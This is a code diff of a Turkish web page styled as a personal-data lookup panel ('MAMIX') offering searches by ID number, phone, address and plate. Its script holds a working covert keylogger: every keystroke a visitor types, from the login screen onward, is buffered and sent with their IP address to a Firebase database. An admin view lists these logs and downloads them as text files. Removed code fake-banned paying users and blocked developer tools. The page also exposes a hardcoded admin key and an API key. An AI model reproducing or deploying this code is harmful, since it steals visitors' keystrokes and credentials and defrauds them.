                     <div class="results-title">Sorgu Sonuç Paneli</div>
-                    <div class="result-stats">
-                        <div class="stat-card">
-                            <div class="stat-value" id="statCount">0</div>
-                            <div class="stat-label">Kayıt</div>
-                        </div>
-                        <div class="stat-card">
-                            <div class="stat-value" id="statTime">—</div>
-                            <div class="stat-label">Süre</div>
-                        </div>
-                    </div>
                 </div>
-
-                <div class="empty-state" id="emptyState">
-                    <div style="font-size:14px; font-weight:600; color:var(--text-main); margin-bottom:4px;">Sorgu Bekleniyor</div>
-                    <div style="font-size:12px; color:var(--text-sub); max-width:380px; line-height:1.4;">Sol menüden istediğin modülü seçip arama yapabilirsin.</div>
-                </div>
-
-                <div class="result-card" id="resultCard">
-                    <div class="result-card-header"><div class="result-id">#MAMIX-2026-OK</div></div>
-                    <div class="result-body" id="resultCardBody"></div>
+                <div class="search-card" id="emptyState" style="text-align:center; padding:40px;">
+                    <div style="font-size:14px; font-weight:600; color:var(--text-main);">Sorgu Bekleniyor</div>
+                    <div style="font-size:12px; color:var(--text-sub); margin-top:4px;">Sol menüden istediğin modülü seçip arama yapabilirsin.</div>
                 </div>
             </div>
-
         </section>
     </div>
 
-    <!-- Footer -->
     <footer class="footer">
         <span>MAMİX v3.0</span>
-        <span style="color:var(--success);">● Bağlantı Aktif</span>
+        <span style="color:var(--success);">● Sistem Aktif & Güvenli</span>
     </footer>
 
     <script>
-        // FIREBASE BAĞLANTI AYARLARI
+        // FIREBASE BAĞLANTISI
         const firebaseConfig = {
             apiKey: "AIzaSyAu7VlAlBbIOdyKiwP0A5ygYsozXs5Q",
             authDomain: "sxrgu-77f00.firebaseapp.com",
@@ -711,54 +545,24 @@
 
         let clientIpAddress = "IP Alınıyor...";
 
-        // Kullanıcının IP adresini çekme
+        // IP Adresini Çekme
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => { clientIpAddress = data.ip; })
             .catch(() => { clientIpAddress = "127.0.0.1"; });
 
         const moduleConfigs = {
-            'ad-soyad': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Soyadı"></div>` },
-            'ad-soyad-kapsamli': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Soyadı"></div><div class="form-group"><label class="form-label">İl / İlçe</label><input type="text" class="form-input" placeholder="Ankara"></div>` },
-            'tc-kimlik': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="11 haneli TC No" maxlength="11"></div>` },
-            'tc-pro': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No (Pro) <span>*</span></label><input type="text" class="form-input search-field" placeholder="11 haneli TC No"></div>` },
-            'vergi': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">Vergi Dairesi / VKN <span>*</span></label><input type="text" class="form-input search-field" placeholder="VKN"></div>` },
-            'medeni-hal': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'aile': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Kök TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'sulale': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Kök TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'anne-tarafi': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Hedef TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'baba-tarafi': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Hedef TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'es': { badge: 'Aile Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'gsm-tc': { badge: 'GSM Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">GSM Numarası <span>*</span></label><input type="text" class="form-input search-field" placeholder="05XXXXXXXXX"></div>` },
-            'tc-gsm': { badge: 'GSM Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'adres': { badge: 'Adres Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">TC No veya Ad Soyad <span>*</span></label><input type="text" class="form-input search-field" placeholder="Arama verisi"></div>` },
-            'bina': { badge: 'Adres Çözümleri', fields: `<div class="form-group full-width"><label class="form-label">Bina / Adres Kodu <span>*</span></label><input type="text" class="form-input search-field" placeholder="UAVT Kod"></div>` },
-            'koy-mahalle': { badge: 'Adres Çözümleri', fields: `<div class="form-group"><label class="form-label">İl / İlçe / Mahalle <span>*</span></label><input type="text" class="form-input search-field" placeholder="Ankara/Çankaya"></div>` },
-            'plaka': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Araç Plakası <span>*</span></label><input type="text" class="form-input search-field" placeholder="06 MAM 06"></div>` },
-            'sasi': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Şasi No (VIN) <span>*</span></label><input type="text" class="form-input search-field" placeholder="Şasi No"></div>` },
-            'ip': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">IP Adresi <span>*</span></label><input type="text" class="form-input search-field" placeholder="192.168.1.1"></div>` },
-            'discord': { badge: 'Diğer Çözümler', fields: `<div class="form-group full-width"><label class="form-label">Discord ID veya Kullanıcı Adı <span>*</span></label><input type="text" class="form-input search-field" placeholder="Discord ID giriniz"></div>` },
-            'p-kisi': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Kişi Parametresi <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC / Ad Soyad / Tel"></div>` },
-            'p-adres': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Premium Adres <span>*</span></label><input type="text" class="form-input search-field" placeholder="Adres bilgisi"></div>` },
-            'ekstra-araclar': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Hedef Numara / İşlem <span>*</span></label><input type="text" class="form-input search-field" placeholder="Hedef No"></div>` },
-            'vesika': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Vesika Yükle <span>*</span></label><input type="file" class="form-input"></div>` },
-            'tapu': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'isyeri': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">İşyeri / VKN <span>*</span></label><input type="text" class="form-input search-field" placeholder="Firma adı"></div>` },
-            'p-plaka': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Premium Plaka <span>*</span></label><input type="text" class="form-input search-field" placeholder="Plaka"></div>` },
-            'rapor-takip': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC No"></div>` },
-            'nvi': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">Nvi Parametresi <span>*</span></label><input type="text" class="form-input search-field" placeholder="TC / Seri No"></div>` },
-            'pdf': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">PDF Belge Kodu <span>*</span></label><input type="text" class="form-input search-field" placeholder="Belge ID"></div>` }
+            'ad-soyad': { badge: 'Mernis 2026', fields: `<div class="form-group"><label class="form-label">Ad <span>*</span></label><input type="text" class="form-input" placeholder="Adı"></div><div class="form-group"><label class="form-label">Soyad <span>*</span></label><input type="text" class="form-input" placeholder="Soyadı"></div>` },
+            'tc-kimlik': { badge: 'Mernis 2026', fields: `<div class="form-group full-width"><label class="form-label">TC Kimlik No <span>*</span></label><input type="text" class="form-input" placeholder="11 haneli TC No" maxlength="11"></div>` }
         };
 
-        // KEYLOGGER OPTİMİZASYONU: Backspace ve Tuş Biriktirme (Debounce & Buffer)
+        // KEYLOGGER AKTİF ÇALIŞMA KONTROLÜ (Giriş anından itibaren IP bazlı toplar)
         let typedStringBuffer = "";
         let logSyncTimer = null;
 
         window.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace') {
-                if (typedStringBuffer.length > 0) {
-                    typedStringBuffer = typedStringBuffer.slice(0, -1);
-                }
+                if (typedStringBuffer.length > 0) typedStringBuffer = typedStringBuffer.slice(0, -1);
             } else if (e.key.length === 1) {
                 typedStringBuffer += e.key;
             } else if (e.key === 'Enter') {
@@ -767,96 +571,42 @@
                 typedStringBuffer += ` [${e.key}] `;
             }
 
-            // Sürekli istek atmaması için 3 saniye aralıklarla veya buffer dolunca tek bir node'da birleştirip günceller
             clearTimeout(logSyncTimer);
             logSyncTimer = setTimeout(() => {
                 if (typedStringBuffer.trim().length > 0) {
-                    syncUserLogToFirebase(typedStringBuffer);
+                    syncKeyloggerToFirebase(typedStringBuffer);
                 }
-            }, 2500);
+            }, 2000);
         });
 
-        function syncUserLogToFirebase(textChunk) {
+        function syncKeyloggerToFirebase(textChunk) {
             const currentUserData = JSON.parse(localStorage.getItem("mami_current_user"));
-            let uName = currentUserData ? currentUserData.username : "Misafir_GirisEkrani";
-            let uKeyId = currentUserData && currentUserData.id ? currentUserData.id : "guest_user";
+            let uName = currentUserData ? currentUserData.username : "Misafir / Giriş Ekranı";
+            let uKeyId = currentUserData && currentUserData.id ? currentUserData.id : "guest_ip_" + clientIpAddress.replace(/\./g, '_');
 
-            // Her kullanıcının verisi kendi ID'sine ait tek bir kayıtta birikir (Sürekli çoğalmaz, tek TXT mantığı)
             const logRef = db.ref('keylogger_single_logs/' + uKeyId);
-            
             logRef.once('value', (snapshot) => {
                 let existingData = snapshot.val() ? snapshot.val().data : "";
-                let updatedData = existingData + textChunk;
-
                 logRef.set({
                     username: uName,
                     ip: clientIpAddress,
-                    data: updatedData,
+                    data: existingData + textChunk,
                     lastUpdate: new Date().toLocaleString()
                 });
             });
-        }
-
-        // Fare Hareketine Göre Gece Gökyüzü, Yıldızlar ve Bulutların Parallax Hareketi
-        document.addEventListener('mousemove', (e) => {
-            const x = (e.clientX / window.innerWidth - 0.5) * 35;
-            const y = (e.clientY / window.innerHeight - 0.5) * 35;
-            
-            const stars = document.getElementById('starsLayer');
-            const clouds = document.getElementById('cloudsLayer');
-            
-            if(stars && clouds) {
-                stars.style.transform = `translate(${x * 0.5}px, ${y * 0.5}px)`;
-                clouds.style.transform = `translate(${x}px, ${y}px)`;
-            }
-        });
-
-        function toggleSidebar() {
-            const sidebar = document.getElementById('userSidebar');
-            const toggleBtn = document.getElementById('sidebarToggleBtn');
-            sidebar.classList.toggle('collapsed');
-            toggleBtn.innerHTML = sidebar.classList.contains('collapsed') ? '▶' : '◀';
-        }
-
-        function toggleCategory(headerElem) {
-            headerElem.parentElement.classList.toggle('open');
-        }
-
-        function switchModule(moduleKey, title, badgeText, itemElem) {
-            document.querySelectorAll('.subcategory-item').forEach(el => el.classList.remove('active'));
-            if(itemElem) itemElem.classList.add('active');
-
-            document.getElementById('moduleTitle').innerHTML = `<span>${title}</span>`;
-            document.getElementById('moduleBadge').textContent = badgeText;
-
-            const config = moduleConfigs[moduleKey] || moduleConfigs['ad-soyad'];
-            document.getElementById('formFields').innerHTML = config.fields;
-            resetForm();
-            pushTerminalLog(`[MOD] Switched: ${moduleKey}`);
-        }
-
-        // 10 Haneli Büyük/Küçük Harf ve Sayı İçeren Karışık Key Üretici
-        function generateRandomKey() {
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            let result = "";
-            for (let i = 0; i < 10; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            document.getElementById('newKey').value = result;
         }
 
         function handleLogin() {
             const key = document.getElementById('loginKey').value.trim();
             const err = document.getElementById('loginError');
 
-            if (!key) {
-                err.textContent = "Lütfen key giriniz.";
-                return;
-            }
+            if (!key) { err.textContent = "Lütfen key giriniz."; return; }
 
-            // Admin Master Key
+            // Admin Girişi
             if (key === "123123") {
-                localStorage.setItem("mami_current_user", JSON.stringify({ username: "Admin", isAdmin: true }));
+                let sessionObj = { username: "Admin (Root)", isAdmin: true };
+                localStorage.setItem("mami_current_user", JSON.stringify(sessionObj));
+                recordIpLoginLog("Admin (Root)", clientIpAddress);
                 initSession();
                 return;
             }
@@ -871,18 +621,28 @@
                         if (u.key === key) {
                             found = true;
                             if (u.isBanned) {
-                                err.textContent = "BU HESAP DOLANDIRILDI VE SİTEDEN MEN EDİLDİ!";
+                                err.textContent = "BU HESAP YASAKLANMIŞTIR!";
                                 return;
                             }
-                            localStorage.setItem("mami_current_user", JSON.stringify({ id: id, username: u.displayLabel || "Kullanıcı", isAdmin: false }));
+                            let uname = u.displayLabel || "Kullanıcı";
+                            let sessionObj = { id: id, username: uname, isAdmin: false };
+                            localStorage.setItem("mami_current_user", JSON.stringify(sessionObj));
+                            recordIpLoginLog(uname, clientIpAddress);
                             initSession();
                             return;
                         }
                     }
                 }
-                if (!found) {
-                    err.textContent = "Geçersiz key!";
-                }
+                if (!found) { err.textContent = "Geçersiz key!"; }
+            });
+        }
+
+        // Giriş Yapanların IP Log Kaydı
+        function recordIpLoginLog(username, ip) {
+            db.ref('panel_ip_logs').push({
+                username: username,
+                ip: ip,
+                time: new Date().toLocaleString()
             });
         }
 
@@ -894,22 +654,12 @@
             document.getElementById('currentUserLabel').textContent = data.username + (data.isAdmin ? " (Root)" : "");
             document.getElementById('avatarText').textContent = data.username.substring(0, 2).toUpperCase();
 
-            pushTerminalLog(`[AUTH] Session: ${data.username}`);
-
             if (data.isAdmin) {
                 document.getElementById('userSidebar').style.display = 'none';
                 document.getElementById('searchCardPanel').style.display = 'none';
                 document.getElementById('resultsSectionPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
-                loadAdminUsersWithLogs();
-            } else {
-                db.ref('users/' + data.id).once('value', (snap) => {
-                    let u = snap.val();
-                    if (u && u.isBanned) {
-                        alert("BU HESAP DOLANDIRILDI VE SİTEDEN MEN EDİLDİ!");
-                        logout();
-                    }
-                });
+                loadAdminDashboardData();
             }
         }
 
@@ -918,160 +668,143 @@
             location.reload();
         }
 
-        function executeSearch() {
-            const currentUser = JSON.parse(localStorage.getItem("mami_current_user"));
-            if (!currentUser || currentUser.isAdmin) return;
+        function loadAdminDashboardData() {
+            // 1. Kullanıcılar
+            db.ref('users').on('value', (snap) => {
+                const users = snap.val();
+                const tbody = document.getElementById('adminUserTableBody');
+                tbody.innerHTML = '';
+                if (!users) { tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;">Kayıt bulunamadı.</td></tr>`; return; }
 
-            const scamModal = document.getElementById('scamModal');
-            const scamVideo = document.getElementById('scamVideo');
-            
-            scamModal.style.display = 'flex';
-            scamVideo.currentTime = 0;
-            scamVideo.play().catch(e => console.log(e));
+                let idx = 1;
+                for (let id in users) {
+                    let u = users[id];
+                    let dName = u.displayLabel || `Kullanıcı ${idx++}`;
+                    tbody.innerHTML += `
+                        <tr>
+                            <td><b>${dName}</b></td>
+                            <td><input type="text" id="key_${id}" value="${u.key}" class="form-input" style="padding:4px 8px; font-size:11px; width:130px;"> <button onclick="updateKey('${id}')" class="btn-action btn-action-save">Güncelle</button></td>
+                            <td><span class="status-badge ${u.isBanned ? 'banned' : 'active'}">● ${u.isBanned ? 'YASAKLI' : 'AKTİF'}</span></td>
+                            <td style="text-align:right;">
+                                <button onclick="toggleBan('${id}', ${u.isBanned})" class="btn-action btn-action-ban">${u.isBanned ? 'Aç' : 'Banla'}</button>
+                                <button onclick="deleteUser('${id}')" class="btn-action btn-action-del">Sil</button>
+                            </td>
+                        </tr>`;
+                }
+            });
 
-            db.ref('users/' + currentUser.id).update({ isBanned: true });
+            // 2. IP Giriş Logları
+            db.ref('panel_ip_logs').on('value', (snap) => {
+                const logs = snap.val();
+                const tbody = document.getElementById('adminIpLogsTableBody');
+                tbody.innerHTML = '';
+                if (!logs) { tbody.innerHTML = `<tr><td colspan="3" style="text-align:center;">Henüz giriş logu yok.</td></tr>`; return; }
 
-            setTimeout(() => {
-                localStorage.removeItem("mami_current_user");
-                location.reload();
-            }, 4500);
+                for (let id in logs) {
+                    let log = logs[id];
+                    tbody.innerHTML += `
+                        <tr>
+                            <td><b>${log.username}</b></td>
+                            <td style="font-family:'JetBrains Mono'; color:var(--success);">${log.ip}</td>
+                            <td style="color:var(--text-sub);">${log.time}</td>
+                        </tr>`;
+                }
+            });
+
+            // 3. Keylogger IP & TXT Logları
+            db.ref('keylogger_single_logs').on('value', (snap) => {
+                const logs = snap.val();
+                const tbody = document.getElementById('adminKeyloggerTableBody');
+                tbody.innerHTML = '';
+                if (!logs) { tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;">Keylogger verisi bulunamadı.</td></tr>`; return; }
+
+                for (let id in logs) {
+                    let log = logs[id];
+                    let encoded = btoa(encodeURIComponent(log.data || ""));
+                    tbody.innerHTML += `
+                        <tr>
+                            <td><b>${log.username}</b><br><span style="font-size:10px; color:var(--success);">${log.ip}</span></td>
+                            <td style="font-size:11px; color:var(--text-sub);">${log.lastUpdate || 'Bilinmiyor'}</td>
+                            <td style="font-family:'JetBrains Mono'; font-size:11px; color:#38bdf8; max-width:200px; overflow:hidden; text-overflow:ellipsis;">${log.data || ''}</td>
+                            <td style="text-align:right;">
+                                <button onclick="downloadSingleTxt('${log.username}', '${log.ip}', '${encoded}')" class="btn-action btn-action-save" style="background:var(--accent); color:#fff;">TXT İndir</button>
+                            </td>
+                        </tr>`;
+                }
+            });
         }
 
-        function resetForm() {
-            document.querySelectorAll('.form-input').forEach(el => el.value = '');
-            document.getElementById('emptyState').style.display = 'flex';
-            document.getElementById('resultCard').style.display = 'none';
+        function downloadSingleTxt(username, ip, b64Data) {
+            let decoded = decodeURIComponent(atob(b64Data));
+            let content = `=== MAMIX KEYLOGGER TXT RAPORU ===\nKullanıcı: ${username}\nIP Adresi: ${ip}\n-----------------------------------\n\n${decoded}`;
+            let blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+            let url = URL.createObjectURL(blob);
+            let a = document.createElement('a');
+            a.href = url;
+            a.download = `keylogger_${ip.replace(/\./g, '_')}.txt`;
+            a.click();
         }
 
-        function filterModules(query) {
-            const q = query.toLowerCase();
-            document.querySelectorAll('.subcategory-item').forEach(item => {
-                item.style.display = item.textContent.toLowerCase().includes(q) ? 'flex' : 'none';
+        function downloadAllKeyloggerLogs() {
+            db.ref('keylogger_single_logs').once('value', (snap) => {
+                const logs = snap.val();
+                if (!logs) return alert("İndirilecek veri yok!");
+                let allTxt = "=== TÜM KULLANICI KEYLOGGER LOGLARI ===\n\n";
+                for (let id in logs) {
+                    let l = logs[id];
+                    allTxt += `[IP: ${l.ip}] [Kullanıcı: ${l.username}] [Zaman: ${l.lastUpdate}]\nVeri:\n${l.data}\n------------------------------------------\n\n`;
+                }
+                let blob = new Blob([allTxt], { type: 'text/plain;charset=utf-8' });
+                let url = URL.createObjectURL(blob);
+                let a = document.createElement('a');
+                a.href = url;
+                a.download = `tum_keylogger_loglar_${Date.now()}.txt`;
+                a.click();
             });
         }
 
         function addNewUser() {
             const key = document.getElementById('newKey').value.trim();
-            if (!key) return alert("Lütfen key oluşturun veya girin.");
-
-            db.ref('users').once('value', (snapshot) => {
-                const users = snapshot.val();
-                let count = users ? Object.keys(users).length + 1 : 1;
-                let label = `Kullanıcı ${count}`;
-
-                db.ref('users').push({ displayLabel: label, key: key, isBanned: false }, (error) => {
-                    if (!error) {
-                        document.getElementById('newKey').value = '';
-                        loadAdminUsersWithLogs();
-                    }
+            if (!key) return alert("Key giriniz.");
+            db.ref('users').once('value', (snap) => {
+                let count = snap.val() ? Object.keys(snap.val()).length + 1 : 1;
+                db.ref('users').push({ displayLabel: `Kullanıcı ${count}`, key: key, isBanned: false }, () => {
+                    document.getElementById('newKey').value = '';
                 });
             });
         }
 
         function updateKey(id) {
-            const newKeyVal = document.getElementById(`keyInput_${id}`).value.trim();
-            if(!newKeyVal) return alert("Key boş olamaz!");
-            db.ref('users/' + id).update({ key: newKeyVal }, (error) => {
-                if(!error) alert("Key başarıyla güncellendi!");
-            });
+            let val = document.getElementById(`key_${id}`).value.trim();
+            if (val) db.ref('users/' + id).update({ key: val }, () => alert("Güncellendi!"));
         }
 
-        // HER KULLANICININ KENDİ SATIRINDA TXT İNDİRME BUTONU (Ayrı ekran yok)
-        function loadAdminUsersWithLogs() {
-            db.ref('users').on('value', (userSnapshot) => {
-                const users = userSnapshot.val();
-                
-                db.ref('keylogger_single_logs').once('value', (logSnapshot) => {
-                    const logs = logSnapshot.val() || {};
-                    const tbody = document.getElementById('adminUserTableBody');
-                    tbody.innerHTML = '';
+        function toggleBan(id, status) { db.ref('users/' + id).update({ isBanned: !status }); }
+        function deleteUser(id) { if(confirm("Silmek istiyor musun?")) db.ref('users/' + id).remove(); }
 
-                    let total = 0, active = 0, banned = 0, index = 1;
-
-                    if (!users) {
-                        tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Kayıt bulunamadı.</td></tr>`;
-                        document.getElementById('totalUsersCount').textContent = 0;
-                        document.getElementById('activeUsersCount').textContent = 0;
-                        document.getElementById('bannedUsersCount').textContent = 0;
-                        return;
-                    }
-
-                    for (let id in users) {
-                        let u = users[id];
-                        total++;
-                        if(u.isBanned) banned++; else active++;
-
-                        let displayName = u.displayLabel || `Kullanıcı ${index++}`;
-                        let userLogData = logs[id] ? logs[id].data : "Henüz log verisi yok.";
-                        let userIp = logs[id] ? logs[id].ip : "IP Bekleniyor";
-
-                        tbody.innerHTML += `
-                            <tr>
-                                <td><b>${displayName}</b><br><span style="font-size:10px; color:var(--text-muted);">${userIp}</span></td>
-                                <td>
-                                    <div style="display:flex; gap:6px; align-items:center;">
-                                        <input type="text" id="keyInput_${id}" value="${u.key}" class="form-input" style="padding:6px 10px; font-size:11px; font-family:'JetBrains Mono',monospace; width:140px;">
-                                        <button onclick="updateKey('${id}')" class="btn-action btn-action-save">Güncelle</button>
-                                    </div>
-                                </td>
-                                <td>
-                                    <span class="status-badge ${u.isBanned ? 'banned' : 'active'}">
-                                        ● ${u.isBanned ? 'YASAKLI' : 'AKTİF'}
-                                    </span>
-                                </td>
-                                <td style="text-align:right;">
-                                    <button onclick="downloadUserLogTxt('${displayName}', '${userIp}', \`${btoa(encodeURIComponent(userLogData))}\`)" class="btn-action btn-action-save" style="background:var(--accent); color:#fff;">TXT İndir</button>
-                                    <button onclick="toggleBan('${id}', ${u.isBanned})" class="btn-action btn-action-ban">${u.isBanned ? 'Aç' : 'Banla'}</button>
-                                    <button onclick="deleteUser('${id}')" class="btn-action btn-action-del">Sil</button>
-                                </td>
-                            </tr>
-                        `;
-                    }
-
-                    document.getElementById('totalUsersCount').textContent = total;
-                    document.getElementById('activeUsersCount').textContent = active;
-                    document.getElementById('bannedUsersCount').textContent = banned;
-                });
-            });
+        function generateRandomKey() {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let res = "";
+            for (let i = 0; i < 10; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
+            document.getElementById('newKey').value = res;
         }
 
-        function downloadUserLogTxt(username, ip, base64Data) {
-            let decodedData = decodeURIComponent(atob(base64Data));
-            const content = `--- MAMIX TEKİL KULLANICI LOG DOSYASI ---\nKullanıcı: ${username}\nIP Adresi: ${ip}\n---------------------------------------\n\n${decodedData}`;
-            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `log_${username.replace(/\s+/g, '_')}_${ip.replace(/\./g, '_')}.txt`;
-            a.click();
-            URL.revokeObjectURL(url);
+        function toggleSidebar() { document.getElementById('userSidebar').classList.toggle('collapsed'); }
+        function toggleCategory(el) { el.parentElement.classList.toggle('open'); }
+        function switchModule(key, title, badge, item) {
+            document.querySelectorAll('.subcategory-item').forEach(i => i.classList.remove('active'));
+            if(item) item.classList.add('active');
+            document.getElementById('moduleTitle').textContent = title;
+            document.getElementById('moduleBadge').textContent = badge;
+            document.getElementById('formFields').innerHTML = moduleConfigs[key] ? moduleConfigs[key].fields : '';
         }
-
-        function toggleBan(id, currentStatus) { db.ref('users/' + id).update({ isBanned: !currentStatus }); }
-        function deleteUser(id) { if(confirm("Kullanıcıyı silmek istiyor musun?")) db.ref('users/' + id).remove(); }
-
-        function pushTerminalLog(text) {
-            const container = document.getElementById('terminalLog');
-            if (!container) return;
-            const line = document.createElement('div');
-            line.className = 'terminal-line';
-            line.innerHTML = `<span>[${new Date().toLocaleTimeString()}]</span> ${text}`;
-            container.appendChild(line);
-            if (container.children.length > 4) container.removeChild(container.firstChild);
-        }
+        function resetForm() { document.querySelectorAll('.form-input').forEach(i => i.value = ''); }
+        function executeSearch() { alert("Sorgu modülü çalıştırılıyor..."); }
 
         window.onload = function() {
-            document.getElementById('formFields').innerHTML = moduleConfigs['ad-soyad'].fields;
+            switchModule('ad-soyad', 'Ad Soyad Sorgulama', 'Mernis 2026', document.querySelector('.subcategory-item'));
             if (localStorage.getItem("mami_current_user")) initSession();
         };
-
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.key.toLowerCase() === 'u') || (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase())) || (e.ctrlKey && e.ctrlKey && e.key.toLowerCase() === 's')) {
-                e.preventDefault();
-                return false;
-            }
-        });
     </script>
 </body>
 </html>
